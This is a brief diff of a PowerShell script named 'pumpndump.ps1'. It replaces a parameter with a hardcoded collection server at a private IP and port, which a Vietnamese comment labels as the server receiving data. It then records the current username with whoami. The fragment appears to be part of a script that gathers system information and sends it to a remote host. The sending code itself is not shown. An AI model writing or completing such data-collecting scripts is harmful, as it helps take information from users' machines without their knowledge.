@@ -1,7 +1,5 @@
-# PowerShell Script: pumpndump.ps1
-param (
-    [string]$hq
-)
+# Địa chỉ server nhận dữ liệu
+$hq = "http://192.168.102.132:2024"
 
 # Lấy tên người dùng hiện tại
 $name = whoami
